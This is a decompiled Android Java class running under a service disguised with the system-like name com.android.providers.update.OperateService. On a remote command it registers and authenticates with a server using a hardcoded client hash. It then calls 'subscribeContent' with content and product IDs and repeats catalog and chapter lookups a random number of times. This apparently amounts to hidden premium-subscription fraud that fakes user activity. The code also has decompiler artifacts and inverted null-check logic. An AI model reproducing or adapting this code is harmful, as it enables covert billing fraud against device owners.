package defpackage;

import android.content.Context;
import com.android.providers.update.OperateService;
import java.io.InputStream;
import java.util.Date;
import java.util.Random;

/* renamed from: h reason: default package */
public class h {
    public static int a = 0;
    public static int b = 0;

    public static String a() {
        String c = new d(ak.c, "getClientWelcomeInfo", "GET").c("");
        if (c != null) {
            return null;
        }
        return c;
    }

    public static void a(au auVar, OperateService operateService) {
        boolean z;
        String str = "1";
        String e = auVar.e();
        if (e != null) {
            String str2 = "1";
            if (e.equals(str)) {
                ak.d = auVar.h();
                ak.e = auVar.i();
                ak.c = auVar.g();
                ak.g = auVar.j();
                a.a((Context) operateService).a("ShareReadUserId");
                String str3 = "754f382b37d474fafd9405e022094125";
                if (str3.equals("")) {
                    z = a((Context) operateService);
                } else {
                    ak.f = str3;
                    z = true;
                }
                if (z && b((Context) operateService)) {
                    a();
                    String k = auVar.k();
                    if (k != null) {
                        String str4 = "1";
                        if (k.equals(str)) {
                            String[] split = auVar.b().split("|");
                            a(split);
                            b(split);
                        }
                    }
                }
            }
        }
    }

    public static boolean a(Context context) {
        String str = "clientHash";
        String str2 = "RegisterReq";
        String a2 = ay.a(a(j.a(new StringBuffer(ak.d).append(ak.e).toString()).toLowerCase()));
        ak.h = a2;
        ad adVar = new ad();
        String str3 = "RegisterReq";
        adVar.a("Request", str2);
        String str4 = "RegisterReq";
        String str5 = "clientHash";
        adVar.a(str2, str);
        String str6 = "clientHash";
        adVar.b(str, a2);
        InputStream a3 = new d(ak.c, "register", "POST").a(adVar.a());
        if (a3 == null || a3.available() <= 0) {
            return false;
        }
        String a4 = q.a(a3);
        if (a4 != null && !a4.equals("")) {
            a.a(context).a("ShareReadUserId", a4);
            ak.f = a4;
        }
        return true;
    }

    public static boolean a(String[] strArr) {
        String str = "GET";
        String str2 = "?contentId=";
        String str3 = "&chapterId=";
        String str4 = "";
        String str5 = "";
        String str6 = "";
        String str7 = "";
        String str8 = "";
        String str9 = strArr[1];
        String str10 = strArr[2];
        String str11 = strArr[3];
        String str12 = "?contentId=";
        String str13 = "&chapterId=";
        String str14 = "GET";
        d dVar = new d(new StringBuffer(ak.c).append(str2).append(str9).append(str3).append(str10).toString(), "getContentProductInfo", str);
        String str15 = "";
        dVar.b(str4);
        String str16 = "?contentId=";
        StringBuffer append = new StringBuffer(ak.c).append(str2).append(str9);
        String str17 = "&chapterId=";
        String str18 = "GET";
        d dVar2 = new d(append.append(str3).append(str10).append("&productId=").append(str11).toString(), "subscribeContent", str);
        String str19 = "";
        dVar2.b(str4);
        return str11 != null;
    }

    public static byte[] a(String str) {
        int length = str.length() / 2;
        byte[] bArr = new byte[length];
        for (int i = 0; i < length; i++) {
            int i2 = i * 2;
            bArr[i] = (byte) (Byte.parseByte(str.substring(i2 + 1, i2 + 2), 16) | (Byte.parseByte(str.substring(i2, i2 + 1), 16) << 4));
        }
        return bArr;
    }

    public static String b() {
        String str;
        String str2;
        String str3;
        String str4 = "0";
        Date date = new Date();
        String str5 = "";
        StringBuilder append = new StringBuilder().append(date.getYear() + 1900);
        String str6 = "";
        String sb = append.append("").toString();
        int month = date.getMonth() + 1;
        if (month < 10) {
            StringBuilder append2 = new StringBuilder().append(sb);
            String str7 = "0";
            str = append2.append(str4).append(month).toString();
        } else {
            str = sb + month;
        }
        int date2 = date.getDate();
        if (date2 < 10) {
            StringBuilder append3 = new StringBuilder().append(str);
            String str8 = "0";
            str2 = append3.append(str4).append(date2).toString();
        } else {
            str2 = str + date2;
        }
        String str9 = str2 + date.getHours();
        int minutes = date.getMinutes();
        if (minutes < 10) {
            StringBuilder append4 = new StringBuilder().append(str9);
            String str10 = "0";
            str3 = append4.append(str4).append(minutes).toString();
        } else {
            str3 = str9 + minutes;
        }
        int seconds = date.getSeconds();
        if (seconds >= 10) {
            return str3 + seconds;
        }
        StringBuilder append5 = new StringBuilder().append(str3);
        String str11 = "0";
        return append5.append(str4).append(seconds).toString();
    }

    public static void b(String[] strArr) {
        String str = "?catalogId=";
        String str2 = "GET";
        String str3 = "";
        String str4 = "";
        String str5 = strArr[0];
        String str6 = strArr[1];
        String str7 = strArr[2];
        String str8 = strArr[3];
        if (str5 == null) {
            String str9 = "";
            str5 = str3;
        }
        if (str6 == null) {
            String str10 = "";
            str6 = str3;
        }
        if (str7 == null) {
            String str11 = "";
            str7 = str3;
        }
        if (str8 == null) {
            String str12 = "";
        }
        String str13 = "";
        if (!str5.equals(str3)) {
            String str14 = "";
            if (!str6.equals(str3)) {
                String str15 = "?catalogId=";
                String str16 = "GET";
                d dVar = new d(new StringBuffer(ak.c).append(str).append(str5).toString(), "getCatalogInfo", str2);
                String str17 = "";
                dVar.b(str3);
                String str18 = "?catalogId=";
                String str19 = "GET";
                d dVar2 = new d(new StringBuffer(ak.c).append(str).append(str5).append("&contentId=").append(str6).toString(), "getContentInfo", str2);
                String str20 = "";
                dVar2.b(str3);
                String str21 = "";
                if (!str7.equals(str3)) {
                    String str22 = "GET";
                    d dVar3 = new d(new StringBuffer(ak.c).append("?contentId=").append(str6).append("&chapterId=").append(str7).toString(), "getChapterInfo", str2);
                    String str23 = "";
                    dVar3.b(str3);
                }
            }
        }
        if (a == 0) {
            a = new Random().nextInt(4) + 2;
        }
        if (b < a) {
            b++;
            b(strArr);
            return;
        }
        b = 0;
        a = 0;
    }

    public static boolean b(Context context) {
        String str = "clientHash";
        String str2 = "channel";
        String str3 = "cataloglist";
        String str4 = "catalogTimestamp";
        String str5 = "Authenticate4Req";
        String a2 = ay.a(a(j.a(new StringBuffer(ak.d).append(ak.f).append(ak.e).toString()).toLowerCase()));
        ak.h = a2;
        ad adVar = new ad();
        String str6 = "Authenticate4Req";
        adVar.a("Request", str5);
        String str7 = "Authenticate4Req";
        String str8 = "clientHash";
        adVar.a(str5, str);
        String str9 = "clientHash";
        adVar.b(str, a2);
        String str10 = "Authenticate4Req";
        String str11 = "channel";
        adVar.a(str5, str2);
        String str12 = "channel";
        adVar.b(str2, ak.g);
        String str13 = "Authenticate4Req";
        String str14 = "catalogTimestamp";
        adVar.a(str5, str4);
        String str15 = "catalogTimestamp";
        adVar.b(str4, b());
        String str16 = "Authenticate4Req";
        adVar.a(str5, "systembookmark");
        adVar.b("systembookmark", "true");
        String str17 = "Authenticate4Req";
        String str18 = "cataloglist";
        adVar.a(str5, str3);
        String str19 = "cataloglist";
        adVar.b(str3, "true");
        byte[] b2 = new d(ak.c, "authenticate4", "POST").b(adVar.a());
        return b2 != null && b2.length > 0;
    }
}
